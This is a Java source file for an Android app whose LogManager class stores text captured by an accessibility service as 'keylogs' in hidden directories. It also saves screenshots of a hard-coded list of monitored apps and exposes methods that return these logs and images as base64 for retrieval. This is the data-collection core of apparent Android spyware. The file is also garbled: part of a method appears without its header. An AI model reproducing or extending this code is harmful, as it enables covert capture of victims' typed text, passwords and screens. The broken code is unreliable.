package com.task.tusker.commands;

import android.content.Context;
import android.util.Base64;
import android.util.Log;
import com.task.tusker.utils.Constants;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * LogManager — manages log storage and retrieval.
 *
 * Storage layout (hidden inside app's private internal directory):
 *   /data/data/<pkg>/files/.kl/YYYY-MM-DD.jsonl          — global logs for that day
 *   /data/data/<pkg>/files/.am/<appPkg>/kl/YYYY-MM-DD.jsonl — per-monitored-app logs
 *
 * Auto-started by UnifiedAccessibilityService when accessibility is granted.
 * This class is NOT an AccessibilityService itself — it is a utility
 * called from UnifiedAccessibilityService.
 */
public class LogManager {

    private static final String TAG = "LogManager";

    private static final long TWO_WEEKS_MS = 14L * 24L * 60L * 60L * 1000L;

    private final Context context;
    private final File    klDir;

    private static volatile boolean enabled = false;

    public LogManager(Context context) {
        this.context = context.getApplicationContext();
        // Hidden dir inside app's private internal storage
        this.klDir = new File(context.getFilesDir(), Constants.LOG_DIR);
        if (!klDir.exists()) klDir.mkdirs();
        // Purge stale log files on every service start (runs on a background thread).
        new Thread(this::purgeOldLogs, "LogPurge").start();
    }

    /**
     * Delete any log (.jsonl) files that are older than 2 weeks.
     * Covers both the global directory and every per-app subdirectory.
     */
    private void purgeOldLogs() {
        long cutoff = System.currentTimeMillis() - TWO_WEEKS_MS;

        // 1. Global log directory
        deleteOldInDir(klDir, cutoff);

        // 2. Per-app log subdirectories  (.am/<pkg>/kl/)
        File amDir = new File(context.getFilesDir(), Constants.APP_MONITOR_DIR);
        if (amDir.exists()) {
            File[] appDirs = amDir.listFiles(File::isDirectory);
            if (appDirs != null) {
                for (File appDir : appDirs) {
                    File appKlDir = new File(appDir, "kl");
                    if (appKlDir.exists()) {
                        deleteOldInDir(appKlDir, cutoff);
                    }
                }
            }
        }
    }

    /** Delete all .jsonl files inside {@code dir} whose last-modified time is before {@code cutoff}. */
    private void deleteOldInDir(File dir, long cutoff) {
        File[] files = dir.listFiles(f -> f.getName().endsWith(".jsonl"));
        if (files == null) return;
        for (File f : files) {
            if (f.lastModified() < cutoff) {
                if (f.delete()) {
                    Log.i(TAG, "Purged old log: " + f.getName());
                } else {
                    Log.w(TAG, "Failed to delete: " + f.getName());
                }
            }
        }
    }

    // ── Enable / disable ────────────────────────────────────────────────

    public static void setEnabled(boolean on) {
        enabled = on;
        Log.i(TAG, "LogManager " + (on ? "ENABLED" : "DISABLED"));
    }

    public static boolean isEnabled() {
        return enabled;
    }

    // ── Write a log entry ────────────────────────────────────────────────

    /**
     * Called from UnifiedAccessibilityService for every text event.
     */
    public void logEntry(String packageName, String appName, String text, String eventType) {
        if (!enabled || text == null || text.isEmpty()) return;

        String today = todayStr();
        JSONObject entry = buildEntry(packageName, appName, text, eventType);
        String line = entry.toString() + "\n";

        // 1. Write to global day file
        appendToFile(globalFile(today), line);

        // 2. If package is monitored, write to per-app day file too
        if (isMonitored(packageName)) {
            appendToFile(appFile(packageName, today), line);
        }
    }

    // ── Read / list APIs ────────────────────────────────────────────────

    /** List all available log dates (global). */
    public JSONObject listLogFiles() {
        JSONObject result = new JSONObject();
        try {
            File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
            JSONArray dates = new JSONArray();
            if (files != null) {
                Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName())); // newest first
                for (File f : files) {
                    JSONObject info = new JSONObject();
                    String name = f.getName().replace(".jsonl", "");
                    info.put("date", name);
                    info.put("size", f.length());
                    info.put("filename", f.getName());
                    dates.put(info);
                }
            }
            result.put("success", true);
            result.put("files", dates);
            result.put("count", dates.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Download a specific day's global logs as base64 text. */
    public JSONObject downloadLogFile(String date) {
        JSONObject result = new JSONObject();
        try {
            File f = globalFile(date);
            if (!f.exists()) {
                result.put("success", false);
                result.put("error", "No log file for " + date);
                return result;
            }
            String raw = readFile(f);
            String b64 = Base64.encodeToString(raw.getBytes("UTF-8"), Base64.NO_WRAP);
            result.put("success", true);
            result.put("date", date);
            result.put("base64", b64);
            result.put("size", f.length());
            result.put("lineCount", raw.split("\n").length);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Get recent keylogs as JSON array (for live feed). */
    public JSONObject getKeylogs(int limit) {
        return getLogs(limit);
    }

    /** Clear all global keylogs. */
    public JSONObject clearKeylogs() {
        return clearLogs();
    }

    /** List all available keylog dates (global). */
    public JSONObject listKeylogFiles() {
        return listLogFiles();
    }

    /** Download a specific day's global keylogs as base64 text. */
    public JSONObject downloadKeylogFile(String date) {
        return downloadLogFile(date);
    }

    /** Get keylogs for a specific monitored app. */
    public JSONObject getAppKeylogs(String packageName, String date, int limit) {
        return getAppLogs(packageName, date, limit);
    }

    /** List keylog file dates for an app. */
    public JSONObject listAppKeylogFiles(String packageName) {
        return listAppLogFiles(packageName);
    }

    /** Download a specific day's app keylog as base64. */
    public JSONObject downloadAppKeylogFile(String packageName, String date) {
        return downloadAppLogFile(packageName, date);
    }
            }
            int count = Math.min(lines.size(), limit);
            for (int i = 0; i < count; i++) {
                try { logs.put(new JSONObject(lines.get(i))); } catch (Exception ignored) {}
            }
            result.put("success", true);
            result.put("logs", logs);
            result.put("count", logs.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Clear all global logs. */
    public JSONObject clearLogs() {
        JSONObject result = new JSONObject();
        try {
            File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
            int deleted = 0;
            if (files != null) {
                for (File f : files) {
                    if (f.delete()) deleted++;
                }
            }
            result.put("success", true);
            result.put("deletedFiles", deleted);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    // ── App Monitor APIs ─────────────────────────────────────────────────

    /** List all monitored apps that have data stored. */
    public JSONObject listMonitoredApps() {
        JSONObject result = new JSONObject();
        try {
            File amDir = new File(context.getFilesDir(), Constants.APP_MONITOR_DIR);
            JSONArray apps = new JSONArray();
            if (amDir.exists()) {
                File[] appDirs = amDir.listFiles(File::isDirectory);
                if (appDirs != null) {
                    for (File d : appDirs) {
                        JSONObject info = new JSONObject();
                        info.put("packageName", d.getName());
                        info.put("monitored", isMonitored(d.getName()));
                        // Count log files
                        File klSubDir = new File(d, "kl");
                        File[] kls = klSubDir.exists() ? klSubDir.listFiles(f -> f.getName().endsWith(".jsonl")) : null;
                        info.put("logDays", kls != null ? kls.length : 0);
                        // Count screenshot files
                        File ssDir = new File(d, "ss");
                        File[] sss = ssDir.exists() ? ssDir.listFiles(f -> f.getName().endsWith(".jpg")) : null;
                        info.put("screenshots", sss != null ? sss.length : 0);
                        apps.put(info);
                    }
                }
            }
            result.put("success", true);
            result.put("apps", apps);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Get logs for a specific monitored app. */
    public JSONObject getAppLogs(String packageName, String date, int limit) {
        JSONObject result = new JSONObject();
        try {
            File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                                packageName + "/kl");
            JSONArray logs = new JSONArray();

            if (date != null && !date.isEmpty()) {
                // Specific day
                File f = new File(dir, date + ".jsonl");
                if (f.exists()) {
                    List<String> lines = readLines(f);
                    for (String l : lines) {
                        try { logs.put(new JSONObject(l)); } catch (Exception ignored) {}
                    }
                }
            } else {
                // Latest entries across all days
                File[] files = dir.exists() ? dir.listFiles(f -> f.getName().endsWith(".jsonl")) : null;
                List<String> lines = new ArrayList<>();
                if (files != null) {
                    Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
                    for (File f : files) {
                        List<String> fl = readLines(f);
                        Collections.reverse(fl);
                        lines.addAll(fl);
                        if (lines.size() >= limit) break;
                    }
                }
                int count = Math.min(lines.size(), limit);
                for (int i = 0; i < count; i++) {
                    try { logs.put(new JSONObject(lines.get(i))); } catch (Exception ignored) {}
                }
            }
            result.put("success", true);
            result.put("packageName", packageName);
            result.put("logs", logs);
            result.put("count", logs.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** List log file dates for an app. */
    public JSONObject listAppLogFiles(String packageName) {
        JSONObject result = new JSONObject();
        try {
            File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                                packageName + "/kl");
            JSONArray dates = new JSONArray();
            if (dir.exists()) {
                File[] files = dir.listFiles(f -> f.getName().endsWith(".jsonl"));
                if (files != null) {
                    Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
                    for (File f : files) {
                        JSONObject info = new JSONObject();
                        info.put("date", f.getName().replace(".jsonl", ""));
                        info.put("size", f.length());
                        dates.put(info);
                    }
                }
            }
            result.put("success", true);
            result.put("files", dates);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Download a specific day's app log as base64. */
    public JSONObject downloadAppLogFile(String packageName, String date) {
        JSONObject result = new JSONObject();
        try {
            File f = appFile(packageName, date);
            if (!f.exists()) {
                result.put("success", false);
                result.put("error", "No log for " + packageName + " on " + date);
                return result;
            }
            String raw = readFile(f);
            result.put("success", true);
            result.put("packageName", packageName);
            result.put("date", date);
            result.put("base64", Base64.encodeToString(raw.getBytes("UTF-8"), Base64.NO_WRAP));
            result.put("size", f.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    // ── Screenshot storage for AppMonitor ────────────────────────────────

    /** Store a screenshot for a monitored app. Called from AppMonitor. */
    public void saveAppScreenshot(String packageName, byte[] jpegData) {
        try {
            File ssDir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                                  packageName + "/ss");
            if (!ssDir.exists()) ssDir.mkdirs();
            String ts = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss-SSS", Locale.getDefault()).format(new Date());
            File f = new File(ssDir, ts + ".jpg");
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(jpegData);
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "saveAppScreenshot: " + e.getMessage());
        }
    }

    /** List screenshots for a monitored app. */
    public JSONObject listAppScreenshots(String packageName) {
        JSONObject result = new JSONObject();
        try {
            File ssDir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                                  packageName + "/ss");
            JSONArray list = new JSONArray();
            if (ssDir.exists()) {
                File[] files = ssDir.listFiles(f -> f.getName().endsWith(".jpg"));
                if (files != null) {
                    Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
                    for (File f : files) {
                        JSONObject info = new JSONObject();
                        info.put("filename", f.getName());
                        info.put("timestamp", f.getName().replace(".jpg", "").replace("_", " "));
                        info.put("size", f.length());
                        list.put(info);
                    }
                }
            }
            result.put("success", true);
            result.put("packageName", packageName);
            result.put("screenshots", list);
            result.put("count", list.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Download a specific screenshot as base64 JPEG. */
    public JSONObject downloadAppScreenshot(String packageName, String filename) {
        JSONObject result = new JSONObject();
        try {
            File f = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                              packageName + "/ss/" + filename);
            if (!f.exists()) {
                result.put("success", false);
                result.put("error", "Screenshot not found: " + filename);
                return result;
            }
            byte[] data = readFileBytes(f);
            result.put("success", true);
            result.put("packageName", packageName);
            result.put("filename", filename);
            result.put("base64", Base64.encodeToString(data, Base64.NO_WRAP));
            result.put("size", data.length);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    private JSONObject buildEntry(String pkg, String appName, String text, String type) {
        JSONObject o = new JSONObject();
        try {
            o.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
            o.put("packageName", pkg);
            o.put("appName", appName != null ? appName : pkg);
            o.put("text", text);
            o.put("eventType", type);
        } catch (JSONException ignored) {}
        return o;
    }

    private File globalFile(String date) {
        return new File(klDir, date + ".jsonl");
    }

    private File appFile(String packageName, String date) {
        File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                            packageName + "/kl");
        if (!dir.exists()) dir.mkdirs();
        return new File(dir, date + ".jsonl");
    }

    private String todayStr() {
        return new SimpleDateFormat(Constants.LOG_DATE_FMT, Locale.getDefault()).format(new Date());
    }

    private boolean isMonitored(String pkg) {
        for (String p : Constants.MONITORED_PACKAGES) {
            if (p.equals(pkg)) return true;
        }
        return false;
    }

    private void appendToFile(File f, String line) {
        try {
            FileWriter fw = new FileWriter(f, true);
            fw.write(line);
            fw.close();
        } catch (IOException e) {
            Log.e(TAG, "appendToFile: " + e.getMessage());
        }
    }

    private String readFile(File f) throws IOException {
        BufferedReader br = new BufferedReader(new FileReader(f));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append("\n");
        br.close();
        return sb.toString();
    }

    private byte[] readFileBytes(File f) throws IOException {
        byte[] data = new byte[(int) f.length()];
        java.io.FileInputStream fis = new java.io.FileInputStream(f);
        fis.read(data);
        fis.close();
        return data;
    }

    private List<String> readLines(File f) {
        List<String> result = new ArrayList<>();
        try {
            BufferedReader br = new BufferedReader(new FileReader(f));
            String line;
            while ((line = br.readLine()) != null) {
                if (!line.trim().isEmpty()) result.add(line);
            }
            br.close();
        } catch (IOException e) {
            Log.e(TAG, "readLines: " + e.getMessage());
        }
        return result;
    }

    private void safeError(JSONObject result, Exception e) {
        try {
            result.put("success", false);
            result.put("error", e.getMessage());
        } catch (JSONException ignored) {}
    }
}
